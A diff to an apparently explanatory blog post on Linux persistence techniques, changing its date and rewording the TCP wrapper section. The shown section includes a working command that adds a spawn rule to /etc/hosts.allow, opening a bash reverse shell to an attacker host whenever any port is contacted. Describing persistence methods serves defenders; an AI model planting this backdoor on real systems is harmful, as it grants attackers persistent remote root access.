@@ -3,7 +3,7 @@ layout: single
 title: "Common Linux Persistence Techniques"
 excerpt: "The adversary is attempting to keep their foothold.
 Persistence refers to strategies used by adversaries to maintain access to systems despite restarts, changing credentials, and other disruptions that may terminate their access. "
-date: 2021-08-10 00:22:00 -0000
+date: 2021-05-10 00:22:00 -0000
 classes: wide
 header:
   teaser: 
@@ -204,13 +204,13 @@ TCP wrappers rely on two configuration files as the basis for access control:
 -   ***/etc/hosts.allow***
 -   ***/etc/hosts.deny***
 
-These files are used to determine whether or not a client may connect to a network service on a remote host.
+These files are used to determine whether or not a client may connect to a network service on a remote host. 
+As for PoC, if someone connect to any port on target machine such as SSH, reverse shell will be spawned to adversary server.
 
 	$ Command:
 
 	root@victim$ echo -e "Creating TCP wrapper\nALL: ALL: spawn (bash -c '/bin/bash -i >& /dev/tcp/$ATTACKERIP/4545 0>&1') & :allow" >> /etc/hosts.allow
 
-If someone connect to any port on target machine such as SSH, reverse shell will be spawned to adversary server.
 
 
 ## Reference
